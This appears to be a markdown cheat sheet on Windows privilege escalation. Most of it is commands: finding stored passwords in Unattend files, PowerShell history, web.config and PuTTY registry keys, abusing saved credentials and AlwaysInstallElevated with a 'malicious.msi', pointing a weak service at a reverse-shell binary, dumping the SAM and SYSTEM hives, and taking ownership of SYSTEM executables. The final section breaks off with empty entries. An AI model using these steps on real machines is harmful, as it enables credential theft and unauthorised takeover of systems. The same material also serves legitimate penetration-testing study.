# Looking for Passwords:
## unattended Windows Installations:
	+ C:\Unattend.xml
	+ C:\Windows\Panther\Unattend.xml
	+ C:\Windows\Panther\Unattend\Unattend.xml
	+ C:\Windows\system32\sysprep.inf
	+ C:\Windows\system32\sysprep\sysprep.xml
## Powershell History:
```ps1
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
## Stored Creds:
```ps1
# list the sotred credentials
cmdkey /list
# run command as another user:
runas /savecred /user:admin cmd.exe
```
## IIS Configurations:
```ps1
# looking for "web.config"
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
# quickly find database Creds:
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Creds from "PuTTy"
```ps1
reg query HKEY_CURRENT_USER\Software\<creatorOFputty>\PuTTY\Sessions\ /f "Proxy" /s
```


# Scheduled Tasks:
```ps1
# list of Scheduled Tasks:
schtasks
# for more details on specific task:
schtasks /query /tn vulntask /fo list /v
# check permissions on its binary:
icacls c:\Path\to\executableFile
get-acl c:\Path\to\executableFile
```
# Always Install Elevated:
+ check registry:
	+ C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
	+ C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer	
+ install package from commandLine:
	+ C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi


# Services:
Windows services are managed by the **Service Control Manager (SCM)**. The SCM is a process in charge of **managing the state of services** as needed, checking the current status of any given service and generally providing a way to configure services.

### + check Insecure Permissions on Service Executable
	query on service to get information:
	```ps1
	# look for BINARY_PATH_NAME & SERVICE_START_NAME and check Binary for overwriting it
	C:\> sc qc apphostsvc
	# start & stop a service
	C:\> sc stop windowsscheduler
	C:\> sc start windowsscheduler
	```
	
### + Insecure Service Permissions: 	
there is a chance even if binary is well protected on DACL. we should check service DACL(not binary DACL)
```ps1
# check for service reconfiguration
accesschk64.exe -qlc VULNservice
# reconfigure the service to point to our executable. 
sc config VULNservice binPath= "C:\PATH\TO\reverseSHELL.exe" obj= LocalSystem
```

### + Unquoted Service Paths:
```ps1
# query the service and see if the executable path is unquoted (BINARY_PATH_NAME)
C:\> sc qc "vncserver"
```

### You can look for Services in Registry:
	 HKLM\SYSTEM\CurrentControlSet\Services\	
	
### + Know that: 
Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service,


# Dangerous Tokens
find all the windows tokens with their meanings [Here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants), find more about hot to exploit it [here](https://github.com/gtworek/Priv2Admin)

## SeBackup / SeRestore:
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. attacker can copy the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
- backup SAM and SYSTEM hashes:
	```ps1
	reg save hklm\system C:\anywhere\system.hive
	reg save hklm\sam C:\anywhere\sam.hive
	```


## SeTakeOwnership:	
The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys. search for a service running as SYSTEM and take ownership of the service's executable.Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need
```ps1
# take the executable ownership whit this:
takeown /f C:\Windows\System32\SomeThing.exe
# give your user full permissions, After this, we will replace the Binary:
icacls C:\Windows\System32\SomeThing.exe /grant <Username>:F
```

## SeImpersonate / SeAssignPrimaryToken:
lets keep it short:)))). use this binaries to get systemSHELL:
	+ R
	+ 
	+ 

